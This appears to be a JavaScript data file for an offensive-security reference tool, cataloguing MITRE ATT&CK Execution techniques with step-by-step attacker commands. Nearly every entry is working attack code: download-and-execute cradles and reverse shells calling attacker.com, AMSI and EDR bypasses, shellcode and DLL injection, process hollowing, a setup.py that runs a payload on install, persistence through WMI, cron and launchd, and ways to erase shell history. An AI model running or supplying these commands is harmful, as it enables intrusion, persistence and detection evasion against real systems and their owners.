export const EXECUTION = {
  id: "execution",
  name: "Execution",
  tacticId: "TA0002",
  subtitle: "PowerShell • Bash/Unix Shell • Python • WMI • Macros • Scripting • Scheduled Tasks • LOLBins • Native API • COM/IPC • Software Deployment • Cloud Admin Command • Container Admin • Shared Modules",
  color: "#fbbf24",
  techniques: [
    {
      name: "Command and Scripting Interpreter",
      id: "T1059",
      summary: "PowerShell • bash • Python • cmd.exe • VBScript • JSscript",
      description: "Use built-in scripting interpreters to execute malicious commands and scripts",
      tags: ["PowerShell", "bash", "Python", "cmd.exe", "T1059"],
      steps: [
        "PowerShell execution bypass and download cradle:\n# Execution Policy is NOT a security boundary — it only governs scripts run interactively\n# -ep bypass overrides it without admin privileges\n$ powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -W Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"\n# -W Hidden: no visible window spawned (critical for stealth)\n# -NoProfile: skips profile.ps1 loading (faster, avoids profile-based detections)\n# -NonInteractive: suppresses prompts\n# Alternative download cradles that vary telemetry signatures:\n> (New-Object Net.WebClient).DownloadString('http://attacker.com/sh') | IEX\n> IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('BASE64')))\n> &([scriptblock]::Create((Invoke-WebRequest -UseBasicParsing 'http://attacker.com/sh').Content))",
        "PowerShell AMSI bypass before loading detected tools:\n# AMSI (Antimalware Scan Interface) scans PS script content before execution\n# Without bypass: tools like Mimikatz/Rubeus get flagged and killed mid-run\n# Classic reflection bypass (frequently patched — use obfuscated variant in prod):\n> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n# Alternative — patch AmsiScanBuffer return value to AMSI_RESULT_CLEAN (0x1):\n> $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n> $b = $a.GetField('amsiContext','NonPublic,Static')\n> $c = $b.GetValue($null)\n> [IntPtr]$ptr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($c)\n# Use Invoke-Obfuscation or string concatenation to avoid static detection of bypass strings\n# Test: echo 'AMSI Test Sample' in PS — if no alert, bypass succeeded",
        "Bash reverse shell (Linux/macOS):\n# /dev/tcp is a bash built-in — works without nc, curl, or any external tool\n$ bash -i >& /dev/tcp/attacker.com/4444 0>&1\n# -i: interactive shell; >& redirects stdout+stderr; 0>&1: stdin from same connection\n# If bash /dev/tcp is blocked, use Python (works on almost every Linux system):\n$ python3 -c \"import socket,subprocess,os; s=socket.socket(); s.connect(('attacker.com',4444)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; subprocess.call(['/bin/sh','-i'])\"\n# Listener on attacker side: nc -lvnp 4444\n# Upgrade to full PTY after connection (see Unix Shell technique)",
        "cmd.exe execution via parent process spoofing:\n# EDR/SIEM alert on suspicious parent-child relationships (e.g., Word spawning cmd.exe)\n# PPID spoofing makes cmd.exe appear as child of explorer.exe (legitimate)\n> STARTUPINFOEX si = {0};\n> SIZE_T size = 0;\n> InitializeProcThreadAttributeList(NULL, 1, 0, &size);\n> si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);\n> InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);\n> HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorer_pid);\n> UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParent, sizeof(HANDLE), NULL, NULL);\n> CreateProcess(NULL, L\"cmd.exe\", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);\n# Process tree: explorer.exe → cmd.exe (attacker) — appears fully legitimate",
        "VBScript/JScript execution (legacy but still viable):\n# VBScript/JScript run via wscript.exe/cscript.exe — signed Windows binaries\n# Used where PowerShell is blocked or heavily monitored\n$ wscript //nologo payload.vbs\n$ cscript //nologo payload.vbs\n# Sample VBS dropper:\n> Set objShell = CreateObject(\"WScript.Shell\")\n> Set objHTTP = CreateObject(\"MSXML2.XMLHTTP\")\n> objHTTP.Open \"GET\", \"http://attacker.com/shell.ps1\", False\n> objHTTP.Send\n> objShell.Run \"powershell -enc \" & objHTTP.ResponseText, 0, False\n# 0: window style hidden; False: don't wait for process to finish"
      ]
    },
    {
      name: "Windows Management Instrumentation",
      id: "T1047",
      summary: "wmiexec • WMI subscriptions • lateral movement • remote exec",
      description: "Use WMI for remote command execution and persistent event subscriptions",
      tags: ["WMI", "wmiexec", "wmic.exe", "T1047"],
      steps: [
        "Remote WMI command execution:\n$ wmic /node:192.168.1.100 /user:admin /password:pass process call create \"cmd.exe /c whoami > C:\\\\out.txt\"\n$ python3 wmiexec.py domain/admin:pass@192.168.1.100\n# Executes command on remote host via WMI",
        "WMI event subscription for persistence (Fileless):\n> $EventFilter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='Updater';EventNamespace='root/cimv2';QueryLanguage='WQL';Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120\"}\n> $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='Updater';ExecutablePath='C:\\\\Windows\\\\System32\\\\cmd.exe';CommandLineTemplate=\"/c powershell.exe -enc BASE64\"}\n> Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$EventFilter;Consumer=$Consumer}\n# Persists in WMI repository, executes every ~60 seconds",
        "WMI query for system info (discovery):\n$ wmic computersystem get Name,Domain,TotalPhysicalMemory /value\n$ wmic process get Name,ProcessId,CommandLine /value\n$ wmic product get Name,Version /value\n# Enumerate system, processes, installed software",
        "Remote WMI execution via PowerShell:\n> $wmi = [wmiclass]\"\\\\192.168.1.100\\root\\cimv2:Win32_Process\"\n> $result = $wmi.Create(\"powershell.exe -enc BASE64\")\n> $result.ReturnValue  # 0 = success",
        "Cleanup WMI subscriptions:\n$ Get-WMIObject -Namespace root/subscription -Class __EventFilter | Remove-WmiObject\n$ Get-WMIObject -Namespace root/subscription -Class CommandLineEventConsumer | Remove-WmiObject\n$ Get-WMIObject -Namespace root/subscription -Class __FilterToConsumerBinding | Remove-WmiObject"
      ]
    },
    {
      name: "Scheduled Task / Job",
      id: "T1053",
      summary: "schtasks • at • cron • systemd timer • launchd",
      description: "Create scheduled tasks and cron jobs for immediate or deferred code execution",
      tags: ["schtasks", "cron", "at", "systemd", "T1053"],
      steps: [
        "Windows scheduled task execution:\n$ schtasks /create /tn \"Windows Update\" /tr \"powershell.exe -enc BASE64\" /sc onlogon /ru SYSTEM /f\n$ schtasks /run /tn \"Windows Update\"\n# Runs as SYSTEM on every logon",
        "Remote scheduled task creation:\n$ schtasks /create /s 192.168.1.100 /u domain\\admin /p pass /tn \"Task\" /tr \"cmd.exe /c payload.exe\" /sc once /st 00:00 /f\n# Creates task on remote host\n$ at \\\\192.168.1.100 23:00 cmd.exe /c payload.exe\n# Legacy 'at' command for older systems",
        "Linux cron job:\n$ echo '* * * * * /tmp/.hidden/payload.sh' | crontab -\n$ (crontab -l; echo '@reboot /tmp/.hidden/payload.sh') | crontab -\n# @reboot runs on every system boot",
        "Systemd timer for Linux persistence:\n> [Unit]\n> Description=System Update\n> [Timer]\n> OnBootSec=30s\n> OnUnitActiveSec=300s\n> [Install]\n> WantedBy=timers.target\n$ systemctl enable --now attacker.timer",
        "macOS LaunchDaemon:\n> <?xml version=\"1.0\"?>\n> <plist version=\"1.0\"><dict>\n>   <key>Label</key><string>com.apple.update</string>\n>   <key>ProgramArguments</key><array><string>/tmp/payload.sh</string></array>\n>   <key>RunAtLoad</key><true/>\n> </dict></plist>\n$ launchctl load /Library/LaunchDaemons/com.apple.update.plist"
      ]
    },
    {
      name: "User Execution",
      id: "T1204",
      summary: "Malicious file • macro • script • LNK • ISO • OneNote",
      description: "Trick users into executing malicious files or links through social engineering",
      tags: ["malicious file", "macro", "LNK", "ISO", "T1204"],
      steps: [
        "Malicious Office macro delivery:\n# Craft document with embedded macro\n# Use maldoc or MacroPack for generation\n$ python3 macro_pack.py -t DROPPER -f payload.bat -o invoice.docm\n# Social engineer user to enable macros / trust document",
        "LNK shortcut with double extension trick:\n> $lnk = (New-Object -Com WScript.Shell).CreateShortcut('Invoice_Q4_2024.pdf.lnk')\n> $lnk.TargetPath = 'C:\\Windows\\System32\\cmd.exe'\n> $lnk.Arguments = '/c powershell -w h -ep bypass -c IEX(IWR attacker.com/sh)'\n> $lnk.IconLocation = 'C:\\Windows\\System32\\shell32.dll,153'  # PDF icon\n> $lnk.Save()\n# Appears as PDF icon but executes cmd.exe",
        "ISO container delivery:\n# Package payload inside ISO\n# User mounts ISO (double-click in modern Windows)\n# LNK inside ISO runs without MoTW (no SmartScreen)\n$ mkisofs -o lure.iso -r -J payloads/",
        "OneNote embedded file:\n# Insert .exe or .bat as attachment in OneNote\n# Add banner: 'Click here to view document'\n# User clicks → executes embedded payload\n# Bypass: OneNote attachments not scanned like Office macros",
        "HTML Application (HTA) via email link:\n> <HTML><HEAD><script language='VBScript'>\n> Set objShell = CreateObject('WScript.Shell')\n> objShell.Run 'powershell -enc BASE64', 0\n> </script></HEAD><BODY></BODY></HTML>\n$ mshta.exe http://attacker.com/payload.hta\n# HTA runs as fully trusted application"
      ]
    },
    {
      name: "System Services",
      id: "T1569",
      summary: "sc.exe • psexec • service creation • remote service execution",
      description: "Execute code by creating or abusing Windows services",
      tags: ["sc.exe", "psexec", "service", "T1569"],
      steps: [
        "Create service for code execution:\n$ sc create malservice binPath= \"cmd.exe /k payload.exe\" start= demand type= own\n$ sc start malservice\n$ sc delete malservice\n# Cleanup: delete service after execution",
        "PsExec remote service execution:\n$ psexec.py domain/admin:pass@192.168.1.100 cmd.exe\n$ psexec.exe \\\\192.168.1.100 -u admin -p pass cmd.exe\n# Copies binary, creates service, executes, removes service\n# High noise: creates Windows Security Event ID 7045",
        "Impacket service tools:\n$ smbexec.py domain/admin:pass@192.168.1.100\n# Creates service that runs each command, no binary transfer\n# More stealthy than psexec",
        "Service binary hijacking:\n$ sc qc 'Vulnerable Service'\n# Check binary path - if writable by low-priv user\n$ copy payload.exe 'C:\\Program Files\\Vuln App\\service.exe'\n$ net stop 'Vulnerable Service' && net start 'Vulnerable Service'\n# Escalate to SYSTEM via service restart",
        "Unquoted service path exploitation:\n$ wmic service get Name,PathName | findstr /i /v 'C:\\\\Windows' | findstr /i /v '\"'\n# Find services with unquoted paths containing spaces\n$ copy payload.exe 'C:\\Program Files\\Common.exe'\n# Windows tries C:\\Program.exe then C:\\Program Files\\Common.exe"
      ]
    },
    {
      name: "Exploitation for Client Execution",
      id: "T1203",
      summary: "Browser exploit • Office RCE • PDF exploit • media parser CVE",
      description: "Exploit client-side application vulnerabilities to execute code when user opens malicious content",
      tags: ["browser exploit", "Office CVE", "PDF exploit", "T1203"],
      steps: [
        "Browser exploitation setup:\n$ msfconsole\n> use exploit/multi/browser/firefox_pdfjs_privilege_escalation\n> set SRVHOST attacker.com\n> set PAYLOAD windows/x64/meterpreter/reverse_https\n> exploit\n# Serve exploit, wait for victim browser connection",
        "Office equation editor (CVE-2017-11882):\n$ python2 CVE-2017-11882.py -c 'cmd /c powershell -enc BASE64' -o exploit.doc\n# No macro needed - exploits equation editor stack overflow\n# Works on unpatched Office 2007-2016",
        "Follina / MSDT (CVE-2022-30190):\n$ python3 follina.py --interface eth0 --port 443 --reverse_shell\n# Crafts malicious Word document triggering MSDT\n# Executes without enabling macros\n$ curl http://attacker.com/poc.docx --output lure.docx",
        "PDF JavaScript exploit:\n# Embed JavaScript in PDF targeting Adobe Reader / Acrobat\n# CVE-2019-7089, CVE-2018-4990 - use-after-free\n# Deliver via email or watering hole\n# Less common now due to JS disabled by default",
        "Evaluate target's software versions:\n$ wmic product get Name,Version | findstr -i 'office\\|adobe\\|java\\|flash'\n# Match versions to known CVEs before exploitation"
      ]
    },
    {
      name: "Native API",
      id: "T1106",
      summary: "Windows API • VirtualAlloc • CreateRemoteThread • NtCreateThread",
      description: "Invoke Windows native API calls to execute shellcode and evade script-based detection",
      tags: ["WinAPI", "VirtualAlloc", "NtCreateThread", "T1106"],
      steps: [
        "Classic shellcode execution via Windows API:\n> HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n> LPVOID mem = VirtualAllocEx(proc, NULL, payloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(proc, mem, payload, payloadSize, NULL);\n> CreateRemoteThread(proc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n# Classic DLL injection / shellcode injection pattern",
        "Syscall injection to bypass EDR hooking:\n> // Direct syscall - bypasses EDR userland hooks on NTDLL\n> NtAllocateVirtualMemory(hProcess, &baseAddr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> NtWriteVirtualMemory(hProcess, baseAddr, payload, payloadLen, NULL);\n> NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddr, NULL, FALSE, 0, 0, 0, NULL);\n# Uses syscall numbers directly, avoids NTDLL hooks",
        "Process hollowing:\n> // 1. Create target process in suspended state\n> CreateProcess(NULL, \"svchost.exe\", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n> // 2. Hollow out memory\n> NtUnmapViewOfSection(pi.hProcess, imageBase);\n> // 3. Write payload to hollowed process\n> VirtualAllocEx(pi.hProcess, imageBase, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);\n> // 4. Resume thread\n> ResumeThread(pi.hThread);\n# Malicious code runs in context of legitimate process",
        "APC queue injection:\n> HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);\n> VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n> WriteProcessMemory(hProcess, pMem, payload, payloadSize, NULL);\n> QueueUserAPC((PAPCFUNC)pMem, hThread, NULL);\n# Executes when thread enters alertable state\n# More stealthy than CreateRemoteThread",
        "Load shellcode from remote URL (fileless):\n> using(var wc = new WebClient()) {\n>     byte[] buf = wc.DownloadData(\"https://attacker.com/shell.bin\");\n>     IntPtr ptr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n>     Marshal.Copy(buf, 0, ptr, buf.Length);\n>     CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);\n> }"
      ]
    },
    {
      name: "Inter-Process Communication",
      id: "T1559",
      summary: "COM hijack • DDE • named pipes • shared memory",
      description: "Abuse IPC mechanisms for execution and lateral movement",
      tags: ["COM", "DDE", "named pipes", "T1559"],
      steps: [
        "COM object execution:\n$ powershell -c \"$com = [activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39')); $com.Open('https://attacker.com','',''); $com.Navigate2('https://attacker.com')\"\n# Use COM objects to execute code without PowerShell scripts",
        "DDE in Office documents:\n# Dynamic Data Exchange - executes commands via field codes\n# Insert → Field → DDE field code\n> {DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe -enc BASE64\"}\n# User prompted to allow DDE - social engineer to click Yes",
        "Named pipe for lateral movement:\n> // Server creates named pipe\n> HANDLE hPipe = CreateNamedPipe(\"\\\\\\\\.\\\\pipe\\\\SomeLegitName\", PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 0, 0, 0, NULL);\n> ConnectNamedPipe(hPipe, NULL);\n# Client connects to pipe for C2 over SMB\n# Cobalt Strike SMB beacon uses named pipes",
        "Shared memory execution:\n> // Create shared section\n> NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);\n> NtMapViewOfSection(hSection, hTargetProcess, &pViewBase, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);\n# Write shellcode to shared memory accessible by target process",
        "COM server hijacking for execution:\n$ reg query HKCU\\Software\\Classes\\CLSID /s\n# Find COM objects loaded by target applications\n$ reg add HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32 /ve /d C:\\\\payload.dll\n# Redirect COM object to malicious DLL"
      ]
    },
    {
      name: "Software Deployment Tools",
      id: "T1072",
      summary: "SCCM • Ansible • Puppet • Chef • PDQ • Group Policy",
      description: "Abuse software management and deployment tools to execute code at scale",
      tags: ["SCCM", "Ansible", "Puppet", "PDQ", "T1072"],
      steps: [
        "SCCM application deployment for code execution:\n$ sccmhunter.py -u admin -p pass -d domain.com -dc-ip DC_IP show -users\n# Find SCCM admin accounts, then use SCCM console to deploy\n# Create Application → Deploy to collection → Execute payload",
        "Ansible ad-hoc command execution:\n$ ansible all -m shell -a 'curl http://attacker.com/shell.sh | bash' -i inventory.ini\n$ ansible webservers -m copy -a 'src=payload.py dest=/tmp/update.py' --become\n# Execute across all managed hosts simultaneously",
        "Puppet code execution via manifest:\n> file { '/tmp/payload.sh': ensure => present, content => 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' }\n> exec { 'run_payload': command => '/bin/bash /tmp/payload.sh', require => File['/tmp/payload.sh'] }\n# Applied to all nodes on next Puppet run (30 min default)",
        "PDQ Deploy for Windows mass execution:\n# PDQ Deploy admin console\n# Create package → point to payload.exe\n# Deploy to All Computers collection\n# Executes as SYSTEM on all managed Windows hosts",
        "Abuse deployment tool service accounts:\n$ nxc smb 192.168.1.0/24 -u svc_ansible -H HASH --continue-on-success\n# Deployment service accounts often have broad admin access\n# Lateral movement to all managed systems"
      ]
    },
    {
      name: "Cloud Administration Command",
      id: "T1651",
      summary: "AWS SSM • Azure Run Command • GCP compute exec • cloud shell",
      description: "Use cloud provider administration interfaces to execute commands on cloud-hosted instances",
      tags: ["AWS SSM", "Azure Run Command", "GCP", "T1651"],
      steps: [
        "AWS Systems Manager (SSM) command execution:\n$ aws ssm send-command --document-name 'AWS-RunShellScript' --targets '[{\"Key\":\"tag:Name\",\"Values\":[\"*\"]}]' --parameters 'commands=[\"curl http://attacker.com/shell.sh | bash\"]'\n$ aws ssm start-session --target i-1234567890abcdef0\n# SSM doesn't require open inbound ports - uses outbound HTTPS",
        "Azure VM Run Command:\n$ az vm run-command invoke --resource-group RG --name VM_NAME --command-id RunShellScript --scripts 'curl http://attacker.com/shell.sh | bash'\n# Run arbitrary commands on Azure VMs without SSH/RDP access",
        "GCP compute SSH and exec:\n$ gcloud compute ssh instance-name --zone us-central1-a --command 'curl http://attacker.com/shell.sh | bash'\n$ gcloud compute instances add-metadata instance-name --metadata startup-script='curl attacker.com/sh | bash'\n# Startup script executes on next reboot",
        "AWS Lambda for serverless execution:\n$ aws lambda create-function --function-name update --runtime python3.9 --role ROLE_ARN --handler lambda.handler --zip-file fileb://payload.zip\n$ aws lambda invoke --function-name update /tmp/output.json\n# Execute arbitrary code in Lambda environment",
        "Azure Automation Runbook:\n$ az automation runbook create --resource-group RG --automation-account-name AA --name 'Update' --type Python3\n$ az automation runbook publish --resource-group RG --automation-account-name AA --name 'Update'\n# Runbooks execute in cloud and can access hybrid workers"
      ]
    },
    {
      name: "Container Administration Command",
      id: "T1609",
      summary: "kubectl exec • docker exec • container breakout prep",
      description: "Execute commands on containers via administration interfaces",
      tags: ["kubectl exec", "docker exec", "container", "T1609"],
      steps: [
        "Docker exec into running container:\n$ docker exec -it container_name /bin/bash\n$ docker exec container_name cat /etc/passwd\n# Direct command execution inside container",
        "Kubernetes kubectl exec:\n$ kubectl exec -it pod-name -- /bin/bash\n$ kubectl exec -it pod-name -n namespace -- /bin/sh\n$ kubectl exec -it pod-name -- curl http://attacker.com/shell.sh | bash\n# Requires kubectl exec privileges on the pod",
        "Deploy malicious pod for execution:\n$ kubectl apply -f malicious-pod.yaml\n# malicious-pod.yaml with command/args to execute payload\n# Or: use hostPath to mount host filesystem",
        "Container breakout preparation:\n# Check for privileged mode, capabilities, host mounts\n$ kubectl get pod pod-name -o json | jq '.spec.containers[].securityContext'\n# privileged: true = direct escape to host",
        "Kubernetes DaemonSet for node execution:\n$ kubectl apply -f daemonset.yaml\n# DaemonSet runs on EVERY node in cluster\n# Mass execution across all cluster nodes"
      ]
    },
    {
      name: "Command and Scripting - Unix Shell",
      id: "T1059.004",
      summary: "bash • sh • zsh • fish • shell escape • SUID shell • reverse shell",
      description: "Use Unix shell interpreters for execution, privilege escalation, and persistence",
      tags: ["bash", "sh", "shell escape", "SUID", "T1059"],
      steps: [
        "Bash reverse shells (multiple variants):\n$ bash -i >& /dev/tcp/attacker.com/4444 0>&1\n$ exec bash -i >& /dev/tcp/attacker.com/4444 0>&1\n$ 0<&196;exec 196<>/dev/tcp/attacker.com/4444; sh <&196 >&196 2>&196\n# /dev/tcp built-in — no nc required\n$ bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'",
        "Shell upgrade to fully interactive PTY:\n$ python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Then: Ctrl+Z → stty raw -echo → fg → reset\n$ script /dev/null -c bash  # Alternative method\n$ socat file:$(tty),raw,echo=0 tcp-connect:attacker.com:4444\n# Fully interactive with tab completion, arrow keys, Ctrl+C",
        "Shell escape from restricted environments:\n$ echo $SHELL; env  # Identify shell type\n# rbash escape:\n$ bash --norc  # If bash binary accessible\n$ python3 -c 'import os; os.system(\"/bin/bash\")'  # Python escape\n$ vi → :!/bin/bash  # Editor escape\n$ awk 'BEGIN {system(\"/bin/bash\")}'  # awk escape\n# Reference all methods: https://gtfobins.github.io/",
        "Shell history and audit evasion:\n$ unset HISTFILE; export HISTSIZE=0  # Disable history\n$ HISTFILE=/dev/null bash  # No history written\n$ stty -echo; exec bash 2>/dev/null  # Suppress stderr\n# Some shells log to syslog — use subshell tricks:\n$ bash --norc --noprofile -c 'commands'",
        "Heredoc and process substitution abuse:\n$ bash <(curl -sk https://attacker.com/shell.sh)\n# Process substitution: download+execute without temp file\n$ bash <<'EOF'\n> curl -s http://attacker.com/payload.sh | bash\n> EOF\n# Heredoc execution — no file written to disk"
      ]
    },
    {
      name: "Command and Scripting - Python",
      id: "T1059.006",
      summary: "Python exec • subprocess • ctypes shellcode • pip malicious package",
      description: "Use Python for execution, shellcode injection, and operating system interaction",
      tags: ["Python", "subprocess", "ctypes", "pip package", "T1059"],
      steps: [
        "Python reverse shell:\n$ python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\"",
        "Python shellcode execution via ctypes:\n$ python3 -c \"\nimport ctypes, mmap, struct\nbuf = bytearray(b'\\xfc\\x48...SHELLCODE...')\nm = mmap.mmap(-1, len(buf), prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)\nm.write(bytes(buf))\nm.seek(0)\nptr = ctypes.addressof(ctypes.c_char.from_buffer(m))\nctypes.cast(ptr, ctypes.CFUNCTYPE(None))()\n\"",
        "Malicious pip package:\n$ cat setup.py\nimport os\nfrom setuptools import setup\nos.system('curl -s http://attacker.com/sh | bash')\nsetup(name='legitimate-sounding-tool', version='1.0')\n$ pip install .  # Payload runs at install time\n# PyPI supply chain: publish package with similar name to popular lib",
        "Python AMSI/EDR bypass on Windows:\n# Python ctypes can call WinAPI directly\n> import ctypes\n> ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64\n> ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x3000, 0x40)\n> ctypes.windll.kernel32.RtlMoveMemory(ptr, buf, len(buf))\n> ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)\n# Python shellcode injection — often less monitored than PowerShell",
        "Python as post-exploitation shell:\n$ python3 -m http.server 8080  # Quick file server\n$ python3 -c 'import http.server; http.server.test()'\n# Or: use Python's built-in modules to enumerate environment\n$ python3 -c 'import subprocess; print(subprocess.check_output(\"id;whoami;hostname\",shell=True).decode())'"
      ]
    },
    {
      name: "Shared Modules",
      id: "T1129",
      summary: "DLL loading • LoadLibrary • LD_PRELOAD • module hijacking",
      description: "Load malicious shared libraries and modules into process memory for execution",
      tags: ["DLL", "LD_PRELOAD", "LoadLibrary", "T1129"],
      steps: [
        "Windows DLL injection via LoadLibrary:\n> HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);\n> LPVOID pAddr = VirtualAllocEx(hProcess, NULL, strlen(dllPath)+1, MEM_COMMIT, PAGE_READWRITE);\n> WriteProcessMemory(hProcess, pAddr, dllPath, strlen(dllPath), NULL);\n> HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pAddr, 0, NULL);\n# Classic DLL injection, well-detected but still effective",
        "Linux LD_PRELOAD for shared library injection:\n$ cat payload.c\n> void __attribute__((constructor)) init() { system(\"/bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1\"); }\n$ gcc -shared -fPIC -nostartfiles payload.c -o payload.so\n$ export LD_PRELOAD=/tmp/payload.so\n$ ssh target  # Injected into any subsequent process",
        "LD_PRELOAD persistence via /etc/ld.so.preload:\n$ echo '/tmp/payload.so' >> /etc/ld.so.preload\n# Loaded into every process on the system (requires root)\n# Very stealthy - affects all processes",
        "Reflective DLL loading (no disk write):\n> // Reflective loader maps DLL from memory without disk\n> DWORD ReflectiveLoader(LPVOID lpParameter) {\n>     // Parse PE headers from memory buffer\n>     // Map sections, fix relocations, resolve imports\n>     // Call DLL entry point\n> }\n# Used by Meterpreter, Cobalt Strike, many implants",
        "macOS dylib hijacking:\n$ otool -L /Applications/App.app/Contents/MacOS/App\n# Find dylibs loaded from writable locations\n$ cp malicious.dylib /usr/local/lib/legitimate.dylib\n# Loaded when application starts\n# Persistence through legitimate app launch"
      ]
    }
  ]
};